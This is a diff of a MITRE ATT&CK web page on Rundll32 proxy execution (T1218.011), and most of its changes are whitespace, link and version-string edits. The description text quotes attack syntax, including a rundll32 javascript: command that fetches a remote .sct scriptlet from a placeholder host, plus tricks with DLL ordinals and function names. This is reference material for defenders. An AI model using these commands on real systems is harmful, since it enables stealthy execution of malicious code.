@@ -135,6 +135,7 @@
     <div class="dropdown-menu " aria-labelledby="navbarDropdown">
                 <a class="dropdown-item" href="/versions/v15/resources/">Get Started</a>
                 <a class="dropdown-item" href="/versions/v15/resources/learn-more-about-attack/">Learn More about ATT&CK</a>
+                <a class="dropdown-item" href="/versions/v15/resources/attackcon/">ATT&CKcon</a>
                 <a class="dropdown-item" href="/versions/v15/resources/attack-data-and-tools/">ATT&CK Data & Tools</a>
                 <a class="dropdown-item" href="/versions/v15/resources/faq/">FAQ</a>
                 <a class="dropdown-item" href="/versions/v15/resources/engage-with-attack/contact/">Engage with ATT&CK</a>
@@ -206,7 +207,7 @@
                     <h1 id="">
                             <span id="subtechnique-parent-name">System Binary Proxy Execution:</span>
                         Rundll32
-                    </h1> 
+                    </h1>
 
                         <div class="row">
                             <div class="col-md-8">
@@ -223,8 +224,8 @@
                                                             <th scope="col">ID</th>
                                                             <th scope="col">Name</th>
                                                         </tr>
-                                                    </thead> 
-                                                    <tbody>                                          
+                                                    </thead>
+                                                    <tbody>
                                                             <tr>
                                                                     <td>
                                                                         <a href="/versions/v15/techniques/T1218/001/" class="subtechnique-table-item" data-subtechnique_id="T1218.001"> T1218.001 </a>
@@ -301,7 +302,7 @@
                                                                     <td class="active">
                                                                         T1218.011
                                                                     </td>
-                                                                    <td class="active"> 
+                                                                    <td class="active">
                                                                         Rundll32
                                                                     </td>
                                                             </tr>
@@ -337,14 +338,12 @@
                                                                         <a href="/versions/v15/techniques/T1218/015/" class="subtechnique-table-item" data-subtechnique_id="T1218.015"> Electron Applications </a>
                                                                     </td>
                                                             </tr>
-                               
-                                                    </tbody>                           
+                                                    </tbody>
                                                 </table>
                                             </div>
                                         </div>
                                     </div>
                                     <!--start-indexing-for-search-->
-   
 
                                     <div class="description-body">
                                                 <p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. <a href="/versions/v15/techniques/T1129">Shared Modules</a>), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).</p><p>Rundll32.exe can also be used to execute <a href="/versions/v15/techniques/T1218/002">Control Panel</a> Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. <span onclick=scrollToRef('scite-1') id="scite-ref-1-a" class="scite-citeref-number" title="Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017."data-reference="Trend Micro CPL"><sup><a href="https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf" target="_blank" data-hasqtip="0" aria-describedby="qtip-0">[1]</a></sup></span></p><p>Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. <span onclick=scrollToRef('scite-2') id="scite-ref-2-a" class="scite-citeref-number" title="B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018."data-reference="This is Security Command Line Confusion"><sup><a href="https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/" target="_blank" data-hasqtip="1" aria-describedby="qtip-1">[2]</a></sup></span></p><p>Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.<span onclick=scrollToRef('scite-3') id="scite-ref-3-a" class="scite-citeref-number" title="Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021."data-reference="Attackify Rundll32.exe Obscurity"><sup><a href="https://www.attackify.com/blog/rundll32_execution_order/" target="_blank" data-hasqtip="2" aria-describedby="qtip-2">[3]</a></sup></span><span onclick=scrollToRef('scite-4') id="scite-ref-4-a" class="scite-citeref-number" title="gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021."data-reference="Github NoRunDll"><sup><a href="https://github.com/gtworek/PSBits/tree/master/NoRunDll" target="_blank" data-hasqtip="3" aria-describedby="qtip-3">[4]</a></sup></span> DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).</p><p>Additionally, adversaries may use <a href="/versions/v15/techniques/T1036">Masquerading</a> techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.<span onclick=scrollToRef('scite-5') id="scite-ref-5-a" class="scite-citeref-number" title="Ariel silver. (2022, February 1). Defense Evasion Techniques. Retrieved April 8, 2022."data-reference="rundll32.exe defense evasion"><sup><a href="https://www.cynet.com/attack-techniques-hands-on/defense-evasion-techniques/" target="_blank" data-hasqtip="4" aria-describedby="qtip-4">[5]</a></sup></span> </p>
@@ -1546,7 +1545,7 @@
                             <div class="tables-mobile">
                                 <table class="table table-bordered table-alternate mt-2">
                                     <thead>
-                                        <tr> 
+                                        <tr>
                                             <th scope="col">ID</th>
                                             <th scope="col">Mitigation</th>
                                             <th scope="col">Description</th>
@@ -1648,7 +1647,7 @@
 </table>
 </div>
 
-                
+
                             <h2 class="pt-3" id="references">References</h2>
 
         <div class="row">
@@ -2948,7 +2947,6 @@
         </div>
 
 
-    
                 </div>
             </div>
         </div>
@@ -3009,7 +3007,7 @@
                                         <u class="footer-link"><a href="/versions/v15/resources/legal-and-branding/privacy" class="footer-link">Privacy Policy</a></u>
                                     </div>
                                 <div class="px-3">
-                                    <u class="footer-link"><a href="/versions/v15/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" data-html="true" title="ATT&amp;CK content v15.1&#013;Website  v4.1.4">Website Changelog</a></u>
+                                    <u class="footer-link"><a href="/versions/v15/resources/changelog.html" class="footer-link" data-toggle="tooltip" data-placement="top" data-html="true" title="ATT&amp;CK content v15.1&#013;Website  v4.1.5">Website Changelog</a></u>
                                 </div>
                             </div>
                             <div class="row">
@@ -3049,8 +3047,8 @@
     <script src="/versions/v15/theme/scripts/popper.min.js"></script>
     <script src="/versions/v15/theme/scripts/bootstrap-select.min.js"></script>
     <script src="/versions/v15/theme/scripts/bootstrap.bundle.min.js"></script>
-    <script src="/versions/v15/theme/scripts/site.js?1950"></script>
-    <script src="/versions/v15/theme/scripts/settings.js?3019"></script>
+    <script src="/versions/v15/theme/scripts/site.js?7139"></script>
+    <script src="/versions/v15/theme/scripts/settings.js?268"></script>
     <script src="/versions/v15/theme/scripts/search_bundle.js"></script>
 
 <!--SCRIPTS-->
